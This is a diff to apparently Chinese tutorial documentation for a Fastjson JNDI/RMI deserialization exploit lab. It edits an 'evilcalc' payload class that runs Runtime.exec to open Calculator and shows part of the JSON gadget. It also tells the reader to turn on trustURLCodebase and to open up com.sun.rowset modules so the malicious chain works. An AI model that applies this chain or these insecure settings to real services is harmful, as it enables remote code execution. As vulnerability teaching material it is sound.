@@ -49,7 +49,8 @@
     public class evilcalc {
         public evilcalc (){
             try{
-                Runtime.getRuntime().exec("open -a Calculator");
+                // Runtime.getRuntime().exec("calc.exe"); // Windows
+                Runtime.getRuntime().exec("open -a Calculator"); // macOS
             }catch (Exception e){
                 e.printStackTrace();
             }
@@ -68,9 +69,7 @@
         "autoCommit":true
     }
 
-注意：
-1）因为本项目是jdk17，默认情况下无法使用com.sun.rowset进行恶意链利用，需要在项目启动参数中添加 --add-opens java.sql.rowset/com.sun.rowset=ALL-UNNAMED --add-opens java.sql.rowset/javax.sql.rowset=ALL-UNNAMED
-2）当完成第一步后，还需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+注意：需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
 
 // 后端代码
 @RestController
